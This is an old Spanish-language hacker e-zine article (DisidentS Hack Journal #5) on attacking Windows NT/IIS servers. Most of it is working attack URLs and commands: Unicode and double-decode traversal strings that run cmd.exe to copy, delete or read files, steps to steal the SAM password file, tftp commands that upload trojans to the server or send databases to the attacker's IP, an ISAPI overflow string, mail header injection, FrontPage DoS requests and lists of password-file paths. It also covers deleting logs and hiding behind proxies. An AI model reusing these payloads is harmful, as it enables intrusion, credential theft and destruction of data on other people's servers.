[017]_Windows_NT_by_b-04_-_Disidents_Journal_5
 
 
                     -+-| DisidentS Hack Journal #5 |-+-




   ______________________________________________________________________
  |                                                                      |
  | -+- Titulo_____: Windows NT                                          |
  | -+- Autor______: b-04                                                |
  | -+- E-Mail_____: judas156@hotmail.com                                |
  | -+- Team_______: DisidentS Argentina - http://disidents-team.cjb.net |
  |______________________________________________________________________|




"la potencia sin control..no sirve de nada"
>>------------------------------------------------------------------------<<

"Quiero qué vean, qué no tengo miedo
 yo soy el dueño y este es mi juego
 ahí van mis puños de generación..."



----------------------------------------------------------------------------
----------------------------------------------------------------------------
.==========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================

			1.0 ................... INTRODUCCION
			2.0 ................... Windows NT 
			2.1 ................... ¿Porque elijen Windows NT?
			2.2 ................... Aspectos basicos de IIS
			3.0 ................... Unicode
			3.1 ................... Decode
			3.2 ................... Notas
			3.3 ................... Herramientas
			3.4 ................... Parches
			4.0 ................... ISAPI
			4.1 ................... Explotar el Bug
			4.2 ................... Herramientas
			4.3 ................... Parches
			5.0 ................... MySQL
			5.1 ................... Bug .ida
			5.2 ................... SQLHit.ASP
			5.3 ................... DESCUIDO DEL USUARIO
			6.0 ................... ASP
			6.1 ................... ASP NEW MAIL
			6.2 ................... DESCARGA DE FICHEROS
			7.0 ................... FRONT PAGE
			7.1 ................... SERVIDORES CON EXTENCIONES FRONTPAGE			
			7.2 ................... DoS En Front Page
			8.0 ................... CGI
			8.1 ................... BUGS CGI´S
			9.0 ................... EXPLOITS
			9.1 ................... DoS
		       10.0 ................... Despedida

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
======================================================~ INDICE ~============
============================================================================


1.0 INTRODUCCIØN

Vóy, en este articulo voy a hablar sobre Windows NT, sus bugs y las asañas de mi amigo
Bill.
Algunos consideran que hackear sistemas NT´S es muy kiddie, pero este documento no es
para que seas un 'HackMan-NT´s' (lindo eh xD), si no, es para que conozcas los graves
peligros que corres al usar este sistema y estar en el.
Probablemente muchos sabran esto, ya que es algo viejo, pero aseguro que hay millones
de administradores que usan servidores NT y nisiquiera enterados sobre esto, pero la
razon porque inclui este articulo es sencilla: esta es una e-zine que estamos
epezando de 0, asi que saber un poco de NT´s no vendra nada mal.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

2.0 Windows NT

Windows NT es otra creacion de mi Subestimado amigo Bill Gates, que viene tirando 
desde el ´95 aproximadamente.
A comparacion de Windows 95, el NT usa una particion de tipo NTFS que es mucho mas 
estable que las particiones FAT (16,32) de sistemas Win 9x.
Windows NT ya esta preparado mas que nada para montar servidores (HTTP, FTP, SMPT..),
Usa de servidor web el conocido IIS (Internet Information Systems) que ya va por la 
version 5.0 (oficialmente).
Se largo la version IIS 6.0 pero es un beta y todavia esta en pruebas, asi que en este
articulo no veremos esta version.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

2.1 ¿Porque elijen Windows NT?

¿Porque los administradores elijen Windows NT? simple, dejando afuera lo del monopolio
de Microsoft, un administrador va a un local a comprar un sistema y piensa:

-Por algo Windows vale tanta plata.
-No esperes que algo gratis sea bueno.
-Windows es el sistema operativo mas facil de usar.
-Los sistemas GNU/LINUX son muy dificiles de instalar, no los se manejar y es mucho 
mucho problema, encambio Windows es facil de instalacion uso y manejo.
-Windows ofrece soporte tecnico.

Entonces el administrador ignorante va y compra un Windows NT, sin saber la cantidad
de aujeros que tiene, lo unico que va a hacer sera instalar Windows y su servidor por
defecto (IIS).
Lo que haria un buen administrador, es informarce antes de elejir su S.O en que va 
a hospedar su servidor, se daria cuenta de que cada dia se le descubre un nuevo fallo
a Windows, y veria que el sistema Linux es mucho mas estable, es gratuito y es mucho
mas rapido que Windows, tambien veria que su uso que era tan 'dificil' se puede ir 
'facilitando' y sus entornos graficos y combinaciones de herramientas como PHP, 
APACHE, MySQL, (y otras mas) hacen a un sistema realmente poderoso.
Pero lamentablemente un %30 de administradores piensan asi (algo realmente triste).

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

2.2 Aspectos Basicos De IIS

IIS instala por defecto su servidor web en las siguientes carpetas :

C:\InetPub <- Directorio por defecto donde actua IIS
C:\InetPub\wwwroot <- Ahi iria la web 
C:\InetPub\iissamples <- Archivos como guestbook y imaganes.
C:\InetPub\Scripts <- Scripts
C:\InetPub\AdminScripts <- Ahi hay algunos Scripts en VBS (Visual Basic Script), entre
ellos hay algunos para iniciar\parar el servidor web/ftp etc etc..

Esto viene instalado por deflaut, la mayoria de los administradores dejan el 
directorio web ahi.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

3.0 Unicode \ Decode

Este bug probablemente sea el mas conocido y mas facil de llevar adelante.
Windows NT realiza una rutina de codificacion cada vez que ingresamos a alguna parte 
del sitio y comprueba que no se este llevando acabo algo que no esta permitido.
Una vez echo esto, el servidor traduce esa cadena encriptada y recien ahi si esta todo
correcto, nos lleva a la URL pedida.
Ahora, si nosotros pusiesemos la cadena de codificacion el servidor creeria que el 
esta generando eso y nos daria cierto acceso.
Si nosotros pusiesemos en nuestro browser la siguiente cadena :

http://server.com/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\ 

Windows llamaria a cmd.exe (MS-DOS en NT´S) y pediria que ejecute un dir C:\ y nos 
retornaria los resultados.
Lo que nosotros estamos poniendo es :

http://server.com/scripts/../../winnt/system32/cmd.exe?/c+dir+c:\ 

La cadena %c1%1c representa una "/" codificada, entonces el servidor IIS creeria que
se esta actuando en la carpeta Scripts y pasaria el filtro de seguridad.
Todos los comandos se basan en MS-DOS (dir, del, copy, etc..).
Ahora veremos las variantes para explotar este bug :

http://servidor.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ 
http://servidor.com/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir+c:\ 
http://servidor.com/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\ 
http://servidor.com/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir+c:\ 
http://servidor.com/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ 
http://servidor.com/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\ 

					-

La verdad es que hay muchas variantes y si las pusiese todas ocuparia mucha parte de
este 'tutorial'.
Si el servidor no lista el directorio con alguna de esas variantes, lo mas probable
es que este parcheado o no use de servidor IIS.
Ahora veremos otros comandos utiles :

(a todo esto antepongamoles http://server.com )

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+copy+c:\autoexec.bat c:\inetpub\wwwroot

Esto copia el autoexec.bat a c:\inetpub\wwwroot , si queres copiar otro archivo podes
cambiar donde dice c:\autoexec.bat por la ruta del archivo, EJ: c:\winnt\repair\sam._
y para bajarlo ponemos : 

http://servidor.com/nombre-del-archivo.extencion
                                
				  -

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+md+c:\PARCHEA_TU_WINDOWS

Esto crea una carpeta en C:\ llamada "PARCHEA_TU_WINDOWS"

				-

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+type+c:\TXT.TXT

Con eso podremos ver un archivo .TXT, cambiar la cadena "c:\TXT.TXT" por la ruta del 
archivo TXT.

				-

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+echo+parchea+esto>c:\lee.txt

Esto crea un TXT llamado "LEE.TXT" con el texto "PARCHEA ESTO". Para cambiar el texto
modifica "parchea+esto" por el texto que quieras, entre palabra y palabra debe aver
un signo "+" (sin comillas).

					-

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+ren+c:\autoexec.bat c:\auto.bat

Esto renombraria el archivo autoexec.bat por auto.bat. Si queres renombrar otro 
archivo cambia la ruta, Ej: c:\InetPub\wwwroot\index.htm index2.htm .

					-

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+del+c:\autoexec.bat

Esto borraria el archivo autoexec.bat, si quieren borrar otro archivo, cambiar la ruta
EJ: C:\winnt\win.ini .
(Puse los archivos autoexec.bat y win.ini porque se me ocurrio, no es para que entres
al servidor y borres todos sus archivos de arranque, sistema y web.)

					-

Si nosotros queremos subir un archivo al servidor, necesitaremos un TFTP.
Podemos usar el SolarWinds (www.solarwinds.net).
Para subir un archivo, una vez abierto y configurado el TFTP para recibir y enviar 
archivos, ponemos la siguiente linea :

/scripts/..%c0%af../winnt/system32/tftp.exe+-i+xxx.xxx.xxx+GET+archivo.ext+c:\inetpub

Donde dice "xxx.xxx.xxx" debe ir nuestro IP y donde dice "archivo.ext" el archivo que
queremos copiar, donde dice "c:\inetpub" debe ir la carpeta donde se guardara este 
archivo.
Para ejecutar el archivo, (suponiendo que se halla guardado en c:\inetpub\wwwroot),
ponemos :

http://servidor.com/archivo.ext

Si es un .exe el browser se quedara cargando, esto significa que abrio el archivo.
Algunas ideas :

-Podemos subirle algun troyano para despues facilitarnos la tarea.
-Podemos subirle alguna cosa echa en ASP para subir archivos sin tener que andar 
usando TFTP.

Si queremos bajar algun archivo de el servidor usando TFTP, ponemos :

/scripts/..%c0%af../winnt/system32/tftp.exe+-i+xxx.xxx.xxx+PUT+c:\archivo.ext+c:\

Donde "xxx.xxx.xxx" es nuestra IP y "c:\archivo.ext" es el archivo que queremos copiar
y la ultima parte "C:\" es la ruta donde se guardara en nuestro ordenador.
Algunas ideas :

-Copiar las bases de datos (*.mdb)
-Copiar la sam._ (c:\winnt\repair\sam._)
-Copiar archivos .DAT con informacion sobre clientes de FTP, POP3 o SHELL´S.

Si el servidor IIS usa firewall, posiblemente no nos deje subir nada sin autorizacion
del administrador.

					-

Esto seria lo mas importante, no dejar huellas, para ello debemos borrar el LOG :

/scripts/..%c0%af../winnt/system32/cmd.exe?/c+del+ (sigue abajo, ponerlo todo junto)
c:\winnt\system32\logfiles\in020829.log

Donde 020829 es el año/mes/dia.


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
					
3.1 DECODE				

Despues del Unicode, llego el DECODE, consiste en lo mismo que el unicode, nada mas
que cambiada la decodificacion. EJ:

(a todo esto antepongamoles http://server.com )

/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ 
/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+dir+c:\ 
/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ 
/scripts/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+dir+c:\ 

Despues, solo se debe modificar 'c+dir+c:\' por el comando que queramos (ver UNICODE).

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

3.2 NOTAS

Es muy aconsejable usar un servidor proxy http, porque si el administrador se encarga
de buscarte probablemente te encuentre, en cambio con un servidor proxy no quedara tu
ip en el server IIS, si no que quedara la del proxy.
En las lineas de arriba hay que poner http://direccion-servidor.com antes de los 
las lineas para explotar el bug, no las puse porque ocuparia mucho lugar.
Cuando creemos una carpeta, borremos un archivo, subamos algo por tftp o demas, el 
servidor nos dira 'Error CGI', esto significa que el comando se ejecuto con exito.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

3.3 Herramientas

A continuacion pongo algunas herramientas basicas :

ShadowScan : Scanner en rangos, se puede editar el archivo cgi.txt y agregar las 
lineas para que scanee en busca de Unicode / Decode . Lo podremos encontrar en :
http://www.rsh.kiev.ua/downe.htm

URL SCANNER : Scanea en rangos buscando servidores afectados por esta vulneravilidad.
Es un poco mas lento que el ShadowScan, lo podes encontrar en :
http://hacker.es.org/h/URLScanner.zip
Y para los linuxeros : 
http://ftp.cerias.purdue.edu/pub/tools/unix/scanners/scanssh/scanssh-1.3a.tar.gz

ISS: Scanner para Linux. Lo encontramos en : http://www.cotse.com/sw/iss13_tar.gz

Uniscan : Conocen a _Pablo_ ? este kiddie hiso un 'exploit' para Unicode. Lo pueden 
encontrar en : http://www.terra.es/personal2/quickbasic/softwarez/uniscan2.0.zip

Uniconsole : Uniconsole del SSH team, muy bueno, podremos encontrarlo en :
http://hacker.es.org/h/uniconsole.zip

IIS-ZANG : Exploit para Unicode . Podremos encontrarlo en :
www.securityfocus.com/data/vulnerabilities/exploits/iis-zang.exe
Y para los Linuxeros :
www.securityfocus.com/data/vulnerabilities/exploits/iis-zang.c

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

3.4 Parches

Microsoft ya desarrollo los parches para estos bugs.

Parche para IIS 4.0 : 
http://www.microsoft.com/ntserver/nts/downloads/critical/q269862/default.asp

Parche para IIS 5.0 :
http://www.microsoft.com/windows2000/downloads/critical/q269862/default.asp

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

4.0 ISAPI

ISAPI es un filtro de los servidores IIS, lo que hace es comprobar y limitar los bytes
que se envian en una URL, el ISAPI funciona en los archivos .ida, pero como Bill 
siempre piensa en nosotros (Bill :@~), lo hiso funcionar mal, para que cualquiera que
escriba una URL con 240 bytes de datos cause un buffer overflow (desbordamiento de 
bufer) y provoque que el usuario pueda hacer lo que quiera en el server.
Los servidores vulnerables son los IIS de Microsoft que posean el filtro ISAPI (XP, 
Win2k, Nt 4.0).

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

4.1 Explotar el Bug

Podriamos explotar este bug poniendo en nuestro browser :

http://servidor.com/NULL.ida?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=X 

(Ponerlo en 1 sola linea).

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

4.2 Herramientas

Probablemente hayan oido hablar del gusano "Code-Red", lo que hace este gusano es 
explotar el bug ISAPI, modificando un poco su codigo, lo podriamos explotar nosotros.

Code-Red-Scanner : Scanner de rangos diseñado por eEye que busca servidores con bug
ISAPI. Podremos encontrarlo en : http://ftp.ait.ac.th/anti-virus/CodeRedScanner.exe

Lanzadera : Nuestro amigo _Pablo_ tambien piensa en nosotros (sera hijo de Bill?) y 
el super mega-h4x0r-NT´S hiso un programa en qbasic llamado 'lanzadera', lo que hace
es explotar el bug usando el exploit y el netcat. Lo podremos encontrar en:
http://www.terra.es/personal2/quickbasic/softwarez/lanzadera.zip

IISX: Y para los linuxeros : http://www.elhacker.net/exploits/iisx.c

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

4.3 Parches 

A Bill le dieron pena los administradores y desarrolo un parche :

IIS 4.0 : http://www.microsoft.com/Downloads/Release.asp?ReleaseID=30833
IIS 5.0 :http://www.microsoft.com/Downloads/Release.asp?ReleaseID=30800

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

5.0 MySQL

MySQL sirve para crear y administrar bases de datos, seria algo asi como PHP pero 
mas feo en su version para Windows.
MySQL es un lenjuage de OpenSource (codigo abierto) y muchos servidores IIS lo usan.
SQL en su version Windows posee muchos bugs que a continuacion pasare a resumir.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

5.1 Bug .ida

Este bug es un poco torpe, pero puede resultar efectivo a la hora de acceder a un 
servidor.
Explotando este bug el servidor nos devolvera el path (carpeta :P) en que esta metida
la web ; Algunos administradores se creen que por cambiar la carpeta que instala por
defecto IIS (c:\inetpub\) seran 'injuakeables'.
Para explotar este bug solo hace falta poner :

http://www.servidor.com/cualquiercosa.ida

ó

http://www.servidor.com/cualquiercosa.idq

'cualquiercosa' no equivale a nada, es decir, se puede poner lo que se te ocurra y el
servidor respondera.

Y nos dara una pantalla qué dice así :
 
 No se encuentra el archivo c:\inetpub\wwwroot\cualquiercosa.idq

Y cómo ven, ahí esta el path de la web.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

5.2 SQLHit.ASP

Esta vulnerabilidad afecta servidores IIS con servidores SQL instalados bajo la 
carpeta (que se instala por defecto) "/inetpub/iissamples/ISSamples".
SQLHit.ASP se usa para la busqueda basada en SQL (bases de datos y demas).

Pero nosotros podremos explotar una vulnerabilidad y usarlo a nuestro favor para que
nos brinde informacion sobre el servidor o ver codigos de fuente de algun archivo.

¿Cómo explotarlas?

1) http://servidor/iissamples/ISSamples/SQLQHit.asp?CiColumns=*&CiScope=webinfo  
  
Revela la trayectoria fisica de los archivos en la carpeta virtual, tambien revela
información de los archivos y algunas lineas de codigo de fuente .

Si la informacion es sencible, como contraseñas, que guardó ASP interior en el archivo
del asa, puede explotarse de las siguientes maneras :

http://server/iissamples/ISSamples/SQLQHit.asp?CiColumns=*&CiScope=extended_fileinfo
http://server/iissamples/ISSamples/SQLQHit.asp?CiColumns=*&CiScope=extended_webinfo

Con esto no podremos modificar absolutamente nada, solo podremos obtener información 
de archivos como codigos de fuente, peso, fecha, etc.. .

Parches :

Microsoft ya desarrollo los parches para estos bugs. Los encontramos en :

IIS 4.0 : http://www.microsoft.com/technet/treeview/default.asp? (sigue abajo)
url=/technet/itsolutions/security/tools/iischk.asp 

IIS 5.0 : http://www.microsoft.com/technet/treeview/default.asp? (sigue abajo)
url=/technet/itsolutions/security/tools/iis5chk.asp 

		        (Basado en aviso publicado en NtBugTraq)

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

5.3 DESCUIDO DEL USUARIO

Cuando instalamos el servidor SQL este nos pedira que le asignemos un password para
poder administrarlo remotamente, pero hay veces de que el usuario que lo instala (casi
siempre los admins. incompetentes) no establecen passwords y esto queda abierto a 
cualquier usuario de internet, es como el que instala un servidor FTP y no establece
usuarios y deja el total uso a usuarios anonimos (anonymous).

Para entrar en estos servidores, nos instalamos el cliente de MySQL, arbimos una 
ventana MS-DOS, ingresamos al directorio en que esta instalado el cliente MySQL nos
dirigimos a la carpeta bin (cd\ | cd mysql\bin) y ponemos :

mysql  -h servidor.com USER (donde dice user pongamos el nombre de la web. EJ: Yahoo)

Y esto nos intentara conectar con el servidor que indiquemos, algunos comandos utiles:

show databases; <- muestra los usuarios en la bases de datos.

select user(). <- Para ver informacion de un usuario, mail, fecha de registro, etc.

PARCHE :

Establecer una contraseña cuando instalan servidores SQL !! 
Mucha gente los instala porque le prestaron un cd y dicen "algun dia servira para algo
".


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

6.0 ASP

ASP (Active Server Pages) es un lenguaje de programación como PHP, generalmente usado
en plataformas Windows y vale destacar que el lenjuage ASP es muy poderoso pero hoy en
dia yo elijiria PHP.
ASP tiene muchos bugs, a continuación resumire algunos.

PHP seria la evolucion de ASP, como de qbasic a Visual Basic y de Visual Basic a 
Visual Basic.NET, de C a C++ etc etc..

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

6.1 ASP NEW MAIL

CDONTS.NEWMAIL se usa en muchos foros programados en ASP, la cadena %0D%0A significa
'nueva linea', por lo tanto es posible enviar mails desde ese servidor.
Este bug afecta a servidores IIS 5.

Exploit :

http://servidor/bad_with_email_tag.asp? (sigue abajo, ponelo todo junto)
email=mail@victima.com%0D%0Adata%0D%0ASubject:%20Mail%0D%0A%0D%0Spoofeado

(la cadena que dice 'mail@victima.com' se debe remplasar por el mail del destinatario)


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

6.2 DESCARGA DE ARCHIVOS
		
Este es un bug que afecta a los IIS 4, el bug consiste en agregar un '.' (sí, un punto)
al final de la dirección. Nos podriamos descargar todo el codigo en ASP de la web.

Exploit :

Hacer un pedido HTTP al archivo que queremos descargar, EJ :

http://www.server.com/default.asp.


PARCHE :

ftp://microsoft.com/bussys/winnt/winnt-public/fixes/usa/nt40/hotfixes-postsp2/iis-fix 

Y de ahi nos bajamos el parche.

			

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

7.0 FRONT PAGE

Front Page es un editor y creador de webs para plataformas Windows, FrontPage es muy
facil de usar, por lo cual muchos usuarios novatos elijen servidores FrontPage ya que
su uso y manejo es realmente facil.
Este servidor posee muchos bugs, por estos, nosotros podemos acceder al servidor de 
manera no autorizada y/o causarle ataque DoS (Denial Of Service, Denegacion de 
servico).
A continuacion pasare a resumir los dos bugs mas grandes e importantes del servidor 
y editor web FrontPage.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

7.1 SERVIDORES CON EXTENCIONES FRONTPAGE

Este bug afecta a todos los Windows NT con servidores web FrontPage, esto consiste en
acceder al servidor FrontPage de manera no autorizada.

1) Nos conseguimos el Front Page Full.
2) Lo abrimos y vamos a : File > Open A FrontPage Web.. > More Webs > Ponemos el URL >
List webs.

Esto nos mostrara una entrada <ROOT> y podremos ingresar al servidor web de nuestra 
victima.

			(Basado en la alerta de Michael Thomas)

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

7.2 DoS En Front Page

Nosotros podemos solicitarle al servidor web Front Page una cadena URL que incluya 
algun dispositivo dos o de sistema y estos no sabran responder y se colgaran, para 
esto hacemos uso del shtml.exe para enviarle una cadena dos o de sistema.

Exploit :

http://server/_vti_bin/shtml.exe/com1.htm <- Si usa dispositivo com1

http://server/_vti_bin/shtml.exe/aux.htm <- Dispositivo de sistema.


Parche :

http://msdn.microsoft.com/workshop/languages/fp/2000/winfpse.asp 

			
		     (Basado en el aviso de Security Bugware)
 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

8.0 CGI

El CGI (Common Gateway Interface) es un estandar para comunicar aplicaciones externas
con los servidores de información, tales como servidores HTTP o Web. Un programa CGI,
por otro lado es ejecutado en tiempo real, así que puede generar información dinámica.

Un CGI es un ejecutable que puede ser escrito en cualquier lenguaje que puede correr 
el sistema, como puede ser : C/C++, VB, PERL, PASCAL, TCL, etc etc.. ; pero casi toda
la gente prefiere programar scripts CGI, porque son mas faciles de depurar, compilar
y modificar.

Los CGI, generalmente, se guardan en el directorio cgi-bin, en el cual se encuentran
los scripts que se ejecutan por el servidor web.

Con respecto a la seguridad, una de cada diez lineas tiene un bug y se dice que a la 
hora de programar programas CGI es preferible programarlos en perl.

Ahora que tenemos una minima idea de lo que es el CGI, vamos a ver sus bugs.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

8.1 BUGS CGI´S

Algunos bugs CGI´S :

http://www.servidor.com/cgi-bin/upload.html <- Nos lleva a una pagina y nos permite
subir ficheros, ideal para subir un troyano .

http://www.servidor.com/cgi-win/uploader.exe <- Programa para subir ficheros .

http://www.servidor.com/scripts/upload.asp <- Para subir archivos por medio de ASP.

http://www.servidor.com/scripts/samples/search/queryhit.idq? (sigue abajo :P)
CiRestriction=%23FILENAME%3D*.pwd&CiMaxRecordsPerPage=10&CiScope= (abajo :P)
%2F&TemplateName=queryhit&CiSort=rank%5Bd%5D&HTMLQueryForm=%2Fsamples (abajo x)
%2Fsearch%2Fqueryhit.htm  (termina xD) <- (Ponerlo en 1 sola linea) Nos muestra los 

archivos *.pwd (de passwords x)

http://server.com/scripts/tools/newdsn.exe <- Crea un fichero de 44k 

http://server.com/scripts/tools/getdrvs.exe <- Crea un fichero de 44k

http://server.com/scripts/iisadmin/bdir.htr?dir=ht??c:\ <- Nos hace un Dir c:\

http://server.com/GetFile.cfm?FT=Text&FST=Plain&FilePath=C:\\WINNT\\repair\\sam._  <-

Esto nos da la sam (fichero de passwd´s en nt´s)

http://server.com/cgi-bin/whois.cgi?host=|127.0.0.1| <- Info del servidor

server.com/msadc/Samples/SELECTOR/showcode.asp?source=/msadc/Samples/../../../boot.ini

Nos muestra el fichero boot.ini (anteponerle http, y si queres ver otro fichero cambia
el nombre y la ruta, ej.: msadc/Samples/../../../winnt/win.ini ).

http://server.com/Newuser?Image=../../database/rbsserv.mdb <- Muestra la base de datos

Todos los Bugs FrontPage :

http://server.com/_vti_bin/_vti_adm 
http://server.com/_vti_bin/_vti_adm/admin.dll 
http://server.com/_vti_bin/_vti_aut 
http://server.com/_vti_bin/_vti_aut/author.dll 
http://server.com/_vti_bin/_vti_aut/author.exe 
http://server.com/_vti_bin/_vti_aut/dvwssr.dll 
http://server.com/_vti_bin/_vti_cnf 
http://server.com/_vti_bin/cfgwiz.exe 
http://server.com/_vti_bin/fpremadm.exe 
http://server.com/_vti_bin/fpsrvadm.exe 
http://server.com/_vti_bin/shtml.dll 
http://server.com/_vti_bin/shtml.exe 
http://server.com/_vti_cnf 
http://server.com/_vti_inf.html 
http://server.com/_vti_log/author.log 
http://server.com/_vti_pvt/ 
http://server.com/_vti_pvt/_vti_cnf 
http://server.com/_vti_pvt/access.cnf 
http://server.com/_vti_pvt/access.stp 
http://server.com/_vti_pvt/admin.pwd 
http://server.com/_vti_pvt/administrators.pwd 
http://server.com/_vti_pvt/authors.pwd 
http://server.com/_vti_pvt/authors.pwd 
http://server.com/_vti_pvt/service.cnf 
http://server.com/_vti_pvt/service.grp 
http://server.com/_vti_pvt/service.pwd 
http://server.com/_vti_pvt/service.stp 
http://server.com/_vti_pvt/services.cnf 
http://server.com/_vti_pvt/services.stp 
http://server.com/_vti_pvt/shtml.dll 
http://server.com/_vti_pvt/shtml.exe 
http://server.com/_vti_pvt/svcacl.cnf 
http://server.com/_vti_pvt/users.pwd 
http://server.com/_vti_pvt/writeto.cnf 

ASP & IDQ :

http://server.com/iissamples/Exair/Howitworks/Code.asp 
http://server.com/iissamples/exair/howitworks/code.asp 
http://server.com/iissamples/exair/howitworks/Codebrw1.asp 
http://server.com/iissamples/exair/howitworks/codebrws.asp 
http://server.com/iissamples/exair/howitworks/codebrws.asp 
http://server.com/iissamples/exair/Search/advsearch.asp 
http://server.com/iissamples/exair/Search/query.idq 
http://server.com/iissamples/exair/Search/search.idq 
http://server.com/iissamples/iissamples/query.asp 
http://server.com/iissamples/issamples/fastq.idq 
http://server.com/iissamples/issamples/query.idq 
http://server.com/iissamples/query.asp 
http://server.com/iissamples/sdk/asp/docs/codebrw2.asp 
http://server.com/iissamples/sdk/asp/docs/codebrws.asp  
http://server.com/msads/Samples/SELECTOR/showcode.asp 
http://server.com/Sites/Knowledge/Membership/Inspired/ViewCode.asp 
http://server.com/Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp 
http://server.com/Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp 
http://server.com/Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp 
http://server.com/SiteServer/Publishing/viewcode.asp 


Y muchisimos otros mas que quedaron en el tintero .

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

9.0 EXPLOITS

¿Qué es un exploit? 

Un exploit es un programa que explota un bug en un SO. 
Los exploits, generalmente, estan programados en C ó Perl. 
La mayoria de exploits van en windows y en linux, para usarlos necesitaremos un 
compilador si usamos windows (como puede ser el dev), si usamos linux el compilador 
viene incluido (GCC).

